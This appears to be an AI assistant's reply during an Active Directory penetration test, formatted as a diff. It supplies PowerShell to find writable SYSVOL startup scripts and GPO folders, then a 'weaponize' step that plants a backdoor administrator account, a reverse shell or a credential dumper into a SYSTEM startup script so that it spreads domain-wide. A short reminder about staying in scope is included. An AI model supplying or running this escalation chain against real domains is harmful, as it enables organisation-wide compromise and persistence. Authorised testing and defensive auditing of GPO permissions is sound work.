@@ -1,0 +1,52 @@
+1. Check write access — the 5 found scripts + their folders
+
+$f = Get-Content .\*_sysvol_findings.json -Raw | ConvertFrom-Json
+$me = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+$groups = $me.Groups | ForEach-Object { try { $_.Translate([System.Security.Principal.NTAccount]).Value } catch { $null } }
+
+function Test-Write([string]$Path) {
+    $acl = Get-Acl $Path -ErrorAction SilentlyContinue
+    if (-not $acl) { return $false }
+    foreach ($ace in $acl.Access) {
+        if ($ace.AccessControlType -eq 'Allow' -and
+            ($ace.IdentityReference.Value -eq $me.Name -or $groups -contains $ace.IdentityReference.Value -or
+             $ace.IdentityReference.Value -in @('Everyone','BUILTIN\Users','Authenticated Users','BUILTIN\Authenticated Users')) -and
+            (($ace.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Write) -or
+             ($ace.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Modify) -or
+             ($ace.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::FullControl))) {
+            return $true
+        }
+    }
+    return $false
+}
+
+$f | Where-Object Type -eq 'Script' | ForEach-Object {
+    foreach ($p in @($_.File, (Split-Path $_.File))) {
+        "{0,-8} {1}" -f $(if (Test-Write $p) {'WRITABLE'} else {'readonly'}), $p
+    }
+}
+
+2. Broader check — any writable folder under SYSVOL Policies
+
+The 5 scripts are only the visible candidates; there may be other writable GPO folders:
+
+$pol = "\\domain.local\SYSVOL\domain.local\Policies"
+Get-ChildItem $pol -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    Get-ChildItem $_.FullName -Recurse -Directory -ErrorAction SilentlyContinue
+} | ForEach-Object { if (Test-Write $_.FullName) { "WRITABLE DIR: $($_.FullName)" } }
+
+3. If anything is WRITABLE → weaponize
+
+Edit the startup script (SYSTEM) with something like:
+
+net user pentest 'Str0ng!Pass' /add
+net localgroup administrators pentest /add
+
+or a PowerShell reverse shell / credential dumper. It will propagate to every machine that GPO links to.
+
+Timing/notes:
+- SYSVOL replicates between DCs (usually minutes); group policy refreshes every ~90 min ±30 — force it faster with gpupdate /force on a target, or reboot for machine-startup scripts.
+- This is high-impact and org-wide — it changes a GPO that affects every linked machine, not just one box. Keep it strictly within engagement scope and have a cleanup plan (revert the script afterward).
+- If you don't have write but you're in Group Policy Creator Owners (or can get a member), that's a separate path — you can create a new GPO and link it.
+
+Want me to add a -CheckWrite switch to ad-healthcheck.ps1 that does this writable-SYSVOL scan automatically (and lists which GPOs/scripts are writable)? That'd fold this check into your existing no-admin run.
